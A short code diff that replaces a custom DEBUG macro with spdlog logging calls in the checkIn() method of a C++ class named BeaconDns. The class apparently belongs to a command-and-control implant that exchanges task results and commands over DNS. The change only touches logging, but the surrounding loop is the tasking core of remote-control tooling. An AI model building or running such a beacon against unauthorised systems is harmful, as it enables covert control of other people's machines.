@@ -19,19 +19,19 @@ BeaconDns::~BeaconDns()
 
 void BeaconDns::checkIn()
 {	
-	DEBUG("initConnection");
+	SPDLOG_DEBUG("initConnection");
 
 	std::string output;
 	taskResultsToCmd(output);
 
-	DEBUG("sending output.size " << std::to_string(output.size()));
+	SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));
 
 	m_client->sendMessage(output);
 
 	std::string input = m_client->getMsg();
 	while(!input.empty())
 	{
-		DEBUG("received input.size " << std::to_string(input.size()));
+		SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));
 		cmdToTasks(input);
 		input = m_client->getMsg();
 	}
